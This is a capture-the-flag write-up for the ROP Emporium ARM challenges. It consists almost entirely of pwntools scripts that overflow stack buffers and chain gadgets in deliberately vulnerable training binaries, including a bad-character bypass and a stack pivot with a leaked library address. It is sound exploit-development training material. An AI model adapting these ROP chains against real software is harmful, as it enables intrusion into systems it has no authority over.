# ROP Emporium Writeup

## Challenge1_ret2win

```python
from pwn import *

context.os = "linux"
context.arch = "arm"

conn = ssh('pi', 'localhost', password='raspberry', port=5555)
conn.set_working_directory('/home/pi/workplace/rop_emporium/ret2win')
p = conn.process('ret2win_armv5')

ret2win_addr = 0x000105ec               # nm ret2win_armv5|grep ret2win
payload = b"A"*36 + p32(ret2win_addr)
p.sendlineafter(b"> ", payload)

print(p.recvuntil(b'flag:\n'))
print(p.recvline())
```

## Challenge2_split

```python
from pwn import *

context.os = "linux"
context.arch = "arm"

conn = ssh('pi', 'localhost', password='raspberry', port=5555)
conn.set_working_directory('/home/pi/workplace/rop_emporium/split')
p = conn.process('split_armv5')

cat_flag_addr = 0x0002103C
system_addr = 0x000105E0
gadget1 = 0x000103a4    # pop {r3, pc};
gadget2 = 0x00010558    # mov r0, r3; pop {fp, pc};

payload = b"A"*36 + p32(gadget1) + p32(cat_flag_addr) + p32(gadget2) + b"AAAA" + p32(system_addr)
p.sendlineafter(b"> ", payload)
print(p.recvuntil('\n'))
print(p.recvline())
```

## Challenge3_callme

```bash
# run arm elf on x86_64 
$ sudo apt install qemu-user
$ sudo apt install libc6-armel-cross
$ sudo mkdir /etc/qemu-binfmt
$ sudo ln -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm

# bash1
$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi/ ./callme_armv5

# bash2: debug
$ gdb-multiarch
pwndbg> file ./callme_armv5
pwndbg> target remote localhost:1234
```

```python
from pwn import *

context.os = "linux"
context.arch = "arm"
# context.log_level = 'debug'

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./callme_armv5"])

callme_one = 0x00010618
callme_two = 0x0001066C
callme_three = 0x0001060C
pwnme_addr = 0x000107CC
gadget = 0x00010870    # pop {r0, r1, r2, lr, pc}

for callme_i in [callme_one, callme_two, callme_three]:
    payload = b"A"*36 + p32(gadget) + p32(0xdeadbeef) + p32(0xcafebabe) + \
        p32(0xd00df00d) + p32(pwnme_addr) +  p32(callme_i)
    p.sendlineafter(b"> ", payload)
    p.recvuntil(b"Thank you!\n")
    print(p.recvline())
```

## Challenge4_write4

```python
from pwn import *

context.os = "linux"
context.arch = "arm"

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./write4_armv5"])

gadget1 = 0x000105f0        # pop {r3, r4, pc};
gadget2 = 0x000105ec        # str r3, [r4]; pop {r3, r4, pc};
gadget3 = 0x000105f4        # pop {r0, pc};
mem_addr = 0x0002102c       # .bss segment: readelf -S ./write4_armv5
print_file_addr = 0x000105DC

payload = b"A"*36 + p32(gadget1) + b'flag' + p32(mem_addr) + p32(gadget2)
payload += b'.txt' + p32(mem_addr+0x4) + p32(gadget2)
payload += b'AAAA' + b'AAAA' + p32(gadget3)
payload += p32(mem_addr) + p32(print_file_addr)

p.sendlineafter(b"> ", payload)
p.recvuntil(b"Thank you!\n")
print(p.recvline())
```

## Challenge5_badchars

```python
from pwn import *

context.os = "linux"
context.arch = "arm"

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./badchars_armv5"])

gadget1 = 0x00010614    # pop {r5, r6, pc};
gadget2 = 0x0001061c    # eor r1, r1, r6; str r1, [r5]; pop {r0, pc};
mem_addr = 0x00021024   # .data: readelf -S ./badchars_armv5
print_file_addr = 0x000105E0

# b'\xff\xff\xff\xff' xor b'\x99\x93\x9e\x98' = b'\x66\x6c\x61\x67'
# b'\x66\x6c\x61\x67' xor b'\x48\x18\x19\x13' = b'\x2e\x74\x78\x74'
payload = b"A"*44 + p32(gadget1) + p32(mem_addr) + b'\xff\xff\xff\xff' + p32(gadget2)
payload += b'AAAA' + p32(gadget1) + p32(mem_addr) + b'\x99\x93\x9e\x98' + p32(gadget2) 
payload += b'AAAA' + p32(gadget1) + p32(mem_addr+0x4) + b'\x48\x18\x19\x13' + p32(gadget2)
payload += p32(mem_addr) + p32(print_file_addr)

p.sendlineafter(b"> ", payload)
p.recvuntil(b"Thank you!\n")
print(p.recvline())
```

## Challenge6_fluff

```python
from pwn import *

context.os = "linux"
context.arch = "arm"

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./fluff_armv5"])

libfluff_base = 0x3ffb8000
gadget_str =  libfluff_base + 0x000006c0    # strb r2, [r3]; pop {r4, pc}; # str low 8 bit of r2 
gadget1 = 0x00010474                        # pop {r3, pc};
gadget2 = 0x00010658                        # pop {r4, r5, r6, r7, r8, sb, sl, pc};
gadget3 = 0x00010640                        # mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
gadget4 = 0x000105ec                        # pop {r0, r1, r3}; bx r1;
mem_addr = 0x00021024                       # .data
print_file_addr = 0x000105DC

lt = [b'f', b'l', b'a', b'g', b'.', b't', b'x', b't']
payload = b'A' * 36
for i, c in enumerate(lt):
    payload += p32(gadget1) + p32(gadget1) + p32(gadget2)           # r3 = gadget1
    payload += b'AAAA'*5 + c*4 + b'AAAA' + p32(gadget3)
    payload += p32(mem_addr+i) + p32(gadget_str) + b'AAAA'
payload += p32(gadget4) + p32(mem_addr) + p32(print_file_addr) + b'AAAA'

p.sendlineafter(b"> ", payload)
p.recvuntil(b"Thank you!\n")
print(p.recvline())
```

## Challenge7_pivot

```python
from pwn import *

context.os = "linux"
context.arch = "arm"
# context.log_level = "debug"

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./pivot_armv5"])

foothold_plt_addr = 0x0001064C
foothold_got_addr = 0x0002102c  
puts_plt_addr = 0x00010610
main_addr = 0x0001076C

gadget1 = 0x00010810            # pop {fp, pc};
gadget2 = 0x0001080c            # sub sp, fp, #4; pop {fp, pc};
gadget3 = 0x000105d4            # pop {r3, pc};
gadget4 = 0x00010974            # mov r0, r7; blx r3;

# stack pivot
p.recvuntil(b'pivot: ')
stack_addr = int(p.recvn(10), 16)
payload = b'A'*36 + p32(gadget1) + p32(stack_addr+0x4) + p32(gadget2)

# rop_chains: puts(foothold_got_addr); return to main
rop_chains = p32(stack_addr) + p32(foothold_plt_addr)
rop_chains += b'BBBB'*3 + p32(foothold_got_addr) + b'BBBB'*3 + p32(gadget3) # pop {r4, r5, r6, r7, r8, sb, sl, pc}
rop_chains += p32(puts_plt_addr) + p32(gadget4) + b'BBBB'*7 + p32(main_addr)

# first send
p.sendlineafter(b"> ", rop_chains)
p.sendlineafter(b"> ", payload)
print(p.recvuntil(b'libpivot\n'))


# Second send 
foothold_addr = u32(p.recvline(8)[:-1])
ret2win_addr = foothold_addr - 0x834 + 0x9c0    # foothold_addr - foothold_offset + ret2win_offset
print('ret2win addr: ' + str(hex(ret2win_addr)))
payload2 = b'A'*36 + p32(gadget1) + b'AAAA' + p32(ret2win_addr)

p.sendlineafter(b"> ", payload2)
p.sendlineafter(b"> ", payload2)
p.recvuntil(b"Thank you!\n")
print(p.recvline())
```

## Challenge8_ret2csu

```python
from pwn import *

context.os = "linux"
context.arch = "arm"
context.log_level = "debug"

p = process(["qemu-arm","-L","/usr/arm-linux-gnueabi/","./ret2csu_armv5"])

gadget1 = 0x00010474    # pop {r3, pc};
gadget2 = 0x00010644    # pop {r4, r5, r6, r7, r8, sb, sl, pc};
gadget3 = 0x0001062c    # mov r2, sb; mov r1, r8; mov r0, r7; blx r3;

ret2win_plt_addr = 0x00010498
arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

payload = b'A'*36 + p32(gadget1) + p32(ret2win_plt_addr) + p32(gadget2)
payload += b'AAAA'*3 + p32(arg1) + p32(arg2) + p32(arg3) + b'AAAA' + p32(gadget3)

p.sendlineafter(b"> ", payload)
p.recvuntil(b"Thank you!\n")
print(p.recvline())
```



















